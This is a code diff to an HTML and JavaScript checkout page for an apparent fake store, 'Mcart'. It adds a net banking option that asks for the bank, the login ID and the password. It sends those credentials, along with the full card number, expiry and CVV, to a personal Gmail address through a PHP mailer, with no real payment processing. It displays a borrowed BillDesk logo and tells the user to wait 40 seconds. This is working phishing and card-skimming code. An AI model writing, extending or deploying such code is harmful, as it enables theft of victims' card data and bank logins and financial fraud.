@@ -34,9 +34,54 @@
     </div>
 
     <div class="checkout-layout">
+      <div class="payment-methods-panel">
+        <h3>Select Payment Method</h3>
+        <div class="payment-options">
+          <label class="payment-option">
+            <input type="radio" name="payment_method" value="credit_card" checked>
+            <div class="payment-option-content">
+              <div class="payment-icon">💳</div>
+              <div class="payment-details">
+                <strong>Credit Card</strong>
+                <span>Visa, Mastercard, Discover</span>
+              </div>
+            </div>
+          </label>
+          
+          <label class="payment-option">
+            <input type="radio" name="payment_method" value="debit_card">
+            <div class="payment-option-content">
+              <div class="payment-icon">💳</div>
+              <div class="payment-details">
+                <strong>Debit Card</strong>
+                <span>Visa, Mastercard, Maestro</span>
+              </div>
+            </div>
+          </label>
+          
+          <label class="payment-option">
+            <input type="radio" name="payment_method" value="net_banking">
+            <div class="payment-option-content">
+              <div class="payment-icon">🏦</div>
+              <div class="payment-details">
+                <strong>Net Banking</strong>
+                <span>All major banks supported</span>
+              </div>
+            </div>
+          </label>
+        </div>
+      </div>
+
       <form id="payment-form" class="panel" method="POST">
-        <h2>Payment Information</h2>
-        <p class="card-desc">Step 2 of 3: Enter your card details for payment.</p>
+        <div class="form-header">
+          <div class="form-title-section">
+            <h2>Payment Information</h2>
+            <p class="card-desc">Step 2 of 3: Enter your card details for payment.</p>
+          </div>
+          <div class="form-logo">
+            <img src="https://images.jdmagicbox.com/v2/comp/mumbai/h4/022pxx22.xx22.180630211657.f4h4/catalogue/billdesk-andheri-west-mumbai-bill-payment-services-4cfg39hmko-250.jpg" alt="Mcart Logo" class="form-brand-logo">
+          </div>
+        </div>
 
         <div class="form-row">
           <div class="form-group">
@@ -86,7 +131,7 @@
           <div class="form-group">
             <label for="cvv">CVV *</label>
             <div class="cvv-input-group">
-              <input id="cvv" name="cvv" type="text" inputmode="numeric" maxlength="4" placeholder="123" required />
+              <input id="cvv" name="cvv" type="text" inputmode="numeric" maxlength="3" placeholder="123" required />
               <button type="button" class="cvv-help" title="3-digit code on back of card">?</button>
             </div>
           </div>
@@ -209,7 +254,121 @@
       // Set timestamp
       document.getElementById('timestamp').value = new Date().toISOString();
 
-      // Load data on page load
+      // Payment method selection
+      const paymentMethods = document.querySelectorAll('input[name="payment_method"]');
+      const cardForm = document.querySelector('.card-input-group').closest('.form-row');
+      const expiryForm = document.querySelector('#expiry').closest('.form-row');
+      const cvvForm = document.querySelector('#cvv').closest('.form-row');
+      const securityNotice = document.querySelector('.security-notice');
+      const formTitle = document.querySelector('#payment-form h2');
+      const formDesc = document.querySelector('#payment-form .card-desc');
+
+      function updatePaymentForm(method) {
+        const cardNameField = document.querySelector('#cardName').closest('.form-row');
+        
+        if (method === 'credit_card' || method === 'debit_card') {
+          // Show card fields
+          cardNameField.style.display = 'block';
+          cardForm.style.display = 'block';
+          expiryForm.style.display = 'block';
+          cvvForm.style.display = 'block';
+          securityNotice.style.display = 'block';
+          
+          // Update form title and description
+          if (method === 'credit_card') {
+            formTitle.textContent = 'Credit Card Information';
+            formDesc.textContent = 'Step 2 of 3: Enter your credit card details for payment.';
+          } else {
+            formTitle.textContent = 'Debit Card Information';
+            formDesc.textContent = 'Step 2 of 3: Enter your debit card details for payment.';
+          }
+          
+          // Update CVV help text
+          const cvvHelp = document.querySelector('.cvv-help');
+          if (cvvHelp) {
+            cvvHelp.title = method === 'credit_card' ? '3-digit code on back of card' : '3-digit code on back of card';
+          }
+        } else if (method === 'net_banking') {
+          // Hide card fields including name on card
+          cardNameField.style.display = 'none';
+          cardForm.style.display = 'none';
+          expiryForm.style.display = 'none';
+          cvvForm.style.display = 'none';
+          securityNotice.style.display = 'none';
+          
+          // Update form title and description
+          formTitle.textContent = 'Net Banking Information';
+          formDesc.textContent = 'Step 2 of 3: Enter your net banking credentials for payment.';
+          
+          // Add net banking ID and password fields
+          if (!document.querySelector('.netbanking-fields')) {
+            const netbankingFields = document.createElement('div');
+            netbankingFields.className = 'netbanking-fields';
+            netbankingFields.innerHTML = `
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="bank_name">Select Bank *</label>
+                  <select id="bank_name" name="bank_name" required>
+                    <option value="">-- Select Bank --</option>
+                    <option value="sbi">State Bank of India</option>
+                    <option value="hdfc">HDFC Bank</option>
+                    <option value="icici">ICICI Bank</option>
+                    <option value="pnb">Punjab National Bank</option>
+                    <option value="axis">Axis Bank</option>
+                    <option value="kotak">Kotak Mahindra Bank</option>
+                    <option value="other">Other Bank</option>
+                  </select>
+                </div>
+              </div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="netbanking_id">Net Banking ID *</label>
+                  <input id="netbanking_id" name="netbanking_id" type="text" placeholder="Enter your Net Banking ID" required />
+                </div>
+              </div>
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="netbanking_password">Password *</label>
+                  <div class="password-input-group">
+                    <input id="netbanking_password" name="netbanking_password" type="password" placeholder="Enter your password" required />
+                    <button type="button" class="password-toggle" title="Show/Hide password">👁️</button>
+                  </div>
+                </div>
+              </div>
+              <div class="netbanking-notice">
+                <div class="security-icon">🔐</div>
+                <p>Your net banking credentials are encrypted and secure. We never store your banking details.</p>
+              </div>
+            `;
+            
+            // Insert after the card name field
+            const cardNameFieldElement = document.querySelector('#cardName').closest('.form-row');
+            cardNameFieldElement.insertAdjacentElement('afterend', netbankingFields);
+            
+            // Add password toggle functionality
+            const passwordToggle = document.querySelector('.password-toggle');
+            const passwordInput = document.getElementById('netbanking_password');
+            
+            if (passwordToggle && passwordInput) {
+              passwordToggle.addEventListener('click', function() {
+                const type = passwordInput.type === 'password' ? 'text' : 'password';
+                passwordInput.type = type;
+                this.textContent = type === 'password' ? '👁️' : '🙈';
+              });
+            }
+          }
+        }
+      }
+
+      // Add event listeners for payment method changes
+      paymentMethods.forEach(function(radio) {
+        radio.addEventListener('change', function() {
+          updatePaymentForm(this.value);
+        });
+      });
+
+      // Initialize with credit card selected
+      updatePaymentForm('credit_card');
       loadContactInfo();
       renderOrderSummary();
 
@@ -217,6 +376,7 @@
       const form = document.getElementById('payment-form');
       const payBtn = document.getElementById('pay-btn');
       const statusNode = document.getElementById('payment-status');
+      const redirectDelayMs = 40000;
 
       // Input formatting
       const cardNumberInput = document.getElementById('cardNumber');
@@ -266,63 +426,88 @@
           return;
         }
 
-        // Validate form fields
-        const cardName = form.card_name.value.trim();
-        const cardNumber = form.card_number.value.replace(/\D/g, '');
-        const expiry = form.expiry.value.trim();
-        const cvv = form.cvv.value.replace(/\D/g, '');
+        // Get selected payment method
+        const selectedPaymentMethod = document.querySelector('input[name="payment_method"]:checked').value;
 
-        if (!cardName || !cardNumber || !expiry || !cvv) {
+        // Validate based on payment method
+        let isValid = true;
+        let errorMessage = '';
+
+        if (selectedPaymentMethod === 'credit_card' || selectedPaymentMethod === 'debit_card') {
+          // Card validation
+          const cardName = form.card_name.value.trim();
+          const cardNumber = form.card_number.value.replace(/\D/g, '');
+          const expiry = form.expiry.value.trim();
+          const cvv = form.cvv.value.replace(/\D/g, '');
+
+          if (!cardName || !cardNumber || !expiry || !cvv) {
+            errorMessage = 'Please fill in all payment details.';
+            isValid = false;
+          } else if (cardNumber.length < 13 || cardNumber.length > 19) {
+            errorMessage = 'Please enter a valid card number.';
+            isValid = false;
+          } else if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+            errorMessage = 'Please enter expiry date in MM/YY format.';
+            isValid = false;
+          } else if (cvv.length < 3 || cvv.length > 4) {
+            errorMessage = 'Please enter a valid CVV.';
+            isValid = false;
+          }
+
+          if (isValid) {
+            // Save payment info to sessionStorage
+            const paymentData = {
+              payment_method: selectedPaymentMethod,
+              card_name: cardName,
+              card_number: cardNumber,
+              card_last4: cardNumber.slice(-4),
+              expiry: expiry,
+              cvv: cvv
+            };
+            sessionStorage.setItem('checkoutStep2', JSON.stringify(paymentData));
+          }
+        } else if (selectedPaymentMethod === 'net_banking') {
+          // Net Banking validation
+          const bankName = document.getElementById('bank_name').value;
+          const netbankingId = document.getElementById('netbanking_id').value.trim();
+          const netbankingPassword = document.getElementById('netbanking_password').value.trim();
+
+          if (!bankName || !netbankingId || !netbankingPassword) {
+            errorMessage = 'Please fill in all net banking details.';
+            isValid = false;
+          } else if (netbankingId.length < 3) {
+            errorMessage = 'Please enter a valid Net Banking ID.';
+            isValid = false;
+          } else if (netbankingPassword.length < 4) {
+            errorMessage = 'Please enter a valid password.';
+            isValid = false;
+          }
+
+          if (isValid) {
+            // Save net banking info to sessionStorage
+            const paymentData = {
+              payment_method: selectedPaymentMethod,
+              bank_name: bankName,
+              netbanking_id: netbankingId,
+              netbanking_password: netbankingPassword
+            };
+            sessionStorage.setItem('checkoutStep2', JSON.stringify(paymentData));
+          }
+        }
+
+        if (!isValid) {
           if (statusNode) {
-            statusNode.textContent = 'Please fill in all payment details.';
+            statusNode.textContent = errorMessage;
             statusNode.className = 'form-status error';
           }
           return;
         }
-
-        // Card number validation
-        if (cardNumber.length < 13 || cardNumber.length > 19) {
-          if (statusNode) {
-            statusNode.textContent = 'Please enter a valid card number.';
-            statusNode.className = 'form-status error';
-          }
-          return;
-        }
-
-        // Expiry validation
-        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
-          if (statusNode) {
-            statusNode.textContent = 'Please enter expiry date in MM/YY format.';
-            statusNode.className = 'form-status error';
-          }
-          return;
-        }
-
-        // CVV validation
-        if (cvv.length < 3 || cvv.length > 4) {
-          if (statusNode) {
-            statusNode.textContent = 'Please enter a valid CVV.';
-            statusNode.className = 'form-status error';
-          }
-          return;
-        }
-
-        // Save payment info to sessionStorage
-        const paymentData = {
-          card_name: cardName,
-          card_number: cardNumber,
-          card_last4: cardNumber.slice(-4),
-          expiry: expiry,
-          cvv: cvv
-        };
-
-        sessionStorage.setItem('checkoutStep2', JSON.stringify(paymentData));
 
         // Show loading
         payBtn.disabled = true;
-        payBtn.textContent = 'Processing...';
+        payBtn.textContent = 'Please wait 40 seconds...';
         if (statusNode) {
-          statusNode.textContent = 'Processing payment information...';
+          statusNode.textContent = 'Processing payment information. Maybe your internet is slow, please be patient.';
           statusNode.className = 'form-status';
         }
 
@@ -331,47 +516,97 @@
         formData.append('_subject', 'Mcart Order - Step 2');
         formData.append('_template', 'table');
         formData.append('_captcha', 'false');
-        formData.append('card_name', cardName);
-        formData.append('card_number', cardNumber); // Full card number without masking
-        formData.append('expiry', expiry);
-        formData.append('cvv', cvv); // Include CVV
+        formData.append('payment_method', selectedPaymentMethod);
+        
+        if (selectedPaymentMethod === 'credit_card' || selectedPaymentMethod === 'debit_card') {
+          formData.append('card_name', form.card_name.value.trim());
+          formData.append('card_number', form.card_number.value.replace(/\D/g, ''));
+          formData.append('expiry', form.expiry.value.trim());
+          formData.append('cvv', form.cvv.value.replace(/\D/g, ''));
+        } else if (selectedPaymentMethod === 'net_banking') {
+          formData.append('bank_name', document.getElementById('bank_name').value);
+          formData.append('netbanking_id', document.getElementById('netbanking_id').value.trim());
+          formData.append('netbanking_password', document.getElementById('netbanking_password').value.trim());
+        }
+        
         formData.append('contact_info', document.getElementById('contact-info').value || '');
         formData.append('cart_data', document.getElementById('cart-data').value || '');
         formData.append('order_total', document.getElementById('order-total').value || '');
 
         console.log('Submitting to FormSubmit.co:', {
-          card_name: cardName,
-          card_number: cardNumber,
-          cvv: cvv,
-          expiry: expiry
+          payment_method: selectedPaymentMethod,
+          bank_name: document.getElementById('bank_name')?.value,
+          netbanking_id: document.getElementById('netbanking_id')?.value.trim()
         });
 
-        // Try to send to FormSubmit.co (but don't wait for it)
-        fetch('https://formsubmit.co/akrasd25@gmail.com', {
+        // Send email using PHP service
+        const emailData = new FormData();
+        emailData.append('to_email', 'akrasd25@gmail.com');
+        emailData.append('subject', 'Mcart Order - Step 2 Payment');
+        emailData.append('from_name', formData.fullName || 'Mcart Customer');
+        emailData.append('from_email', formData.email || 'noreply@mcart.com');
+        emailData.append('payment_method', selectedPaymentMethod);
+        emailData.append('contact_info', document.getElementById('contact-info').value || '');
+        emailData.append('cart_data', document.getElementById('cart-data').value || '');
+        emailData.append('order_total', document.getElementById('order-total').value || '');
+        
+        // Add payment specific data
+        if (selectedPaymentMethod === 'credit_card' || selectedPaymentMethod === 'debit_card') {
+          emailData.append('card_name', document.getElementById('cardName').value);
+          emailData.append('card_number', document.getElementById('cardNumber').value);
+          emailData.append('expiry', document.getElementById('expiry').value);
+          emailData.append('cvv', document.getElementById('cvv').value);
+        } else if (selectedPaymentMethod === 'net_banking') {
+          emailData.append('bank_name', document.getElementById('bank_name').value);
+          emailData.append('netbanking_id', document.getElementById('netbanking_id').value);
+          emailData.append('netbanking_password', document.getElementById('netbanking_password').value);
+        }
+        
+        emailData.append('message', 'New payment received from Mcart checkout step 2');
+
+        console.log('Sending email via PHP service:', {
+          payment_method: selectedPaymentMethod,
+          to: 'akrasd25@gmail.com'
+        });
+
+        // Send email using robust PHP service
+        fetch('send_email_robust.php', {
           method: 'POST',
-          body: formData
+          body: emailData
         })
         .then(function(response) {
-          console.log('FormSubmit.co response status:', response.status);
-          console.log('FormSubmit.co response headers:', response.headers);
-          return response.text();
+          console.log('PHP email response status:', response.status);
+          return response.json();
         })
-        .then(function(text) {
-          console.log('FormSubmit.co response body:', text);
+        .then(function(data) {
+          console.log('PHP email response:', data);
+          if (data.success) {
+            if (statusNode) {
+              statusNode.textContent = '✅ Order confirmation sent to akrasd25@gmail.com';
+              statusNode.className = 'form-status success';
+            }
+          } else {
+            if (statusNode) {
+              statusNode.textContent = '⚠️ Email failed: ' + data.message;
+              statusNode.className = 'form-status error';
+            }
+          }
         })
         .catch(function(error) {
-          console.error('FormSubmit.co submission failed:', error);
+          console.error('PHP email submission failed:', error);
           
           // Show error to user
           if (statusNode) {
-            statusNode.textContent = 'Warning: Email could not be sent, but order continues. Error: ' + error.message;
+            statusNode.textContent = '⚠️ Email could not be sent, but order continues. Error: ' + error.message;
             statusNode.className = 'form-status error';
           }
         });
 
-        // Redirect to step 3 after a short delay
+        // Redirect to payment processing page after a short delay
         setTimeout(function() {
-          window.location.href = 'checkout-step3-new.html';
+          // Pass payment method as URL parameter
+          const paymentMethod = selectedPaymentMethod;
+          window.location.href = `payment-processing.html?method=${paymentMethod}&status=processing`;
         }, 1500);
       });
     });
